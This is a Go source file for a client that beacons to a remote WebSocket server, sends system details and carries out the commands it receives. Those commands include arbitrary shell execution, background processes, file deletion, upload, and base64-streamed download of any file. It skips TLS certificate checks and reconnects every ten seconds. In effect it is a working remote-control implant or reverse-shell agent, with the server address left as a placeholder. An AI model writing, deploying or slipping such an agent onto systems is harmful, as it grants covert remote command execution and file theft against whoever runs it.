/*
作者：赵博凯
协议：MIT
*/
// 主程序包
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/host"
)

// 常量定义
const (
	HOST               string = "127.0.0.1"  // 服务器地址
	PORT               int    = 8765         // 服务器端口
	INSECURESKIPVERIFY bool   = true         // 跳过证书验证
	VERSION            string = "3.0-beta.1" // 版本号，不要手动修改
)

// 获取系统信息
func get_system_info() string {
	hostInfo, err := host.Info()
	if err != nil {
		return "error"
	}

	cpuInfo, err := cpu.Info()
	if err != nil {
		return "error"
	}

	// 获取操作系统名称，主机名，平台版本，内核版本，内核架构，处理器型号，产品版本
	system := hostInfo.OS
	node := hostInfo.Hostname
	release := hostInfo.PlatformVersion
	version := hostInfo.KernelVersion
	machine := hostInfo.KernelArch
	processor := cpuInfo[0].ModelName
	product_version := VERSION

	systemInfo := fmt.Sprintf("%s %s %s %s %s %s VERSION:%s",
		system, node, release, version, machine, processor, product_version)

	return systemInfo
}

// 判断命令调用函数
func execute_command_main(command string, Executecommand *ExecuteCommand, conn *websocket.Conn) {
	if command == "exit" {
		// 退出命令
		conn.Close()
		os.Exit(0)
	} else if command == "systeminfo" {
		// 获取系统信息
		system_info := Executecommand.get_systeminfo()
		if err := conn.WriteJSON(system_info); err != nil {
			conn.Close()
		}
	} else if command == "ls" {
		// 列出当前目录下的文件
		file_list := Executecommand.get_file_list()
		if err := conn.WriteJSON(file_list); err != nil {
			conn.Close()
		}
	} else if command == "pwd" {
		// 获取当前工作目录
		current_directory, _ := os.Getwd()
		if err := conn.WriteMessage(websocket.TextMessage, []byte(current_directory)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "delete:") {
		// 删除文件或文件夹
		file_path := command[len("delete:"):]
		message := Executecommand.delete_file(file_path)
		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "cp:") {
		// 复制文件或文件夹
		file_info := command[len("cp:"):]
		file_info_list := strings.SplitN(file_info, "(*.*)", 2)
		message := Executecommand.copy_file(file_info_list[0], file_info_list[1])
		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "mv:") {
		// 重命名文件或文件夹
		file_info := command[len("mv:"):]
		file_info_list := strings.SplitN(file_info, "(*.*)", 2)
		message := Executecommand.move_file(file_info_list[0], file_info_list[1])
		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "compress:") {
		// 压缩文件或文件夹
		file_info := command[len("compress:"):]
		file_info_list := strings.SplitN(file_info, "(*.*)", 2)
		message := Executecommand.compress(file_info_list[0], file_info_list[1])
		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "extract:") {
		// 解压文件
		file_info := command[len("extract:"):]
		file_info_list := strings.SplitN(file_info, "(*.*)", 2)
		message, err := Executecommand.extract(file_info_list[0], file_info_list[1])
		if err != nil {
			message = err.Error()
		}
		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "cmd:") {
		// 执行命令
		command = command[len("cmd:"):]
		output := Executecommand.execute_command(command)
		if err := conn.WriteJSON(output); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "bg:") {
		// 后台执行命令
		command = command[len("bg:"):]
		go Executecommand.execute_bg_command(command)
		if err := conn.WriteMessage(websocket.TextMessage, []byte("ok")); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "mkdir:") {
		// 创建目录
		directory := command[len("mkdir:"):]
		result := Executecommand.create_directory(directory)
		if err := conn.WriteMessage(websocket.TextMessage, []byte(result)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "cd:") {
		// 更改目录
		directory := command[len("cd:"):]
		result := Executecommand.change_directory(directory)
		if err := conn.WriteMessage(websocket.TextMessage, []byte(result)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "upload:") {
		// 上传文件
		upload_file_info := command[len("upload:"):]
		file_parts := strings.SplitN(upload_file_info, "(*.*)", 2)
		message := Executecommand.upload_file(file_parts[0], file_parts[1])
		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
			conn.Close()
		}
	} else if strings.HasPrefix(command, "download:") {
		// 下载文件
		message := "finish:zhaobokai"
		file_path := command[len("download:"):]
		file, err := os.Open(file_path)
		if err != nil {
			message = err.Error()
		}
		bufio.NewReader(file)
		buffer := make([]byte, 4096)
		for {
			n, err := file.Read(buffer)
			if err != nil {
				if err != io.EOF {
					message = "error:zhaobokai" + err.Error()
				}
				break
			}
			// 将读取到的数据编码为base64格式
			encode_content := base64.StdEncoding.EncodeToString(buffer[:n])
			if err := conn.WriteMessage(websocket.TextMessage, []byte(encode_content)); err != nil {
				conn.Close()
				break
			}
		}
		file.Close()
		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
			conn.Close()
		}
	} else {
		// 未知命令
		if err := conn.WriteMessage(websocket.TextMessage, []byte("Unknown command")); err != nil {
			conn.Close()
		}
	}
}

// 客户端主循环
func client_loop() {
	// 注意：此处为了简便，跳过了证书验证，如果在生产环境和不受信任的环境中，请将INSECURESKIPVERIFY参数值改为false
	tls_config := &tls.Config{
		InsecureSkipVerify: INSECURESKIPVERIFY,
	}

	dialer := websocket.Dialer{
		TLSClientConfig: tls_config,
	}

	for {
		conn, _, err := dialer.Dial(
			fmt.Sprintf("wss://%s:%d", HOST, PORT),
			nil,
		)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		system_info := get_system_info()
		if err := conn.WriteMessage(websocket.TextMessage, []byte(system_info)); err != nil {
			conn.Close()
			continue
		}
		Executecommand := &ExecuteCommand{conn: conn}

		for {
			_, message, err := conn.ReadMessage()
			if err != nil {
				conn.Close()
				break
			}
			command := string(message)
			execute_command_main(command, Executecommand, conn)
		}
	}
}

// 主函数
func main() {
	client_loop()
}
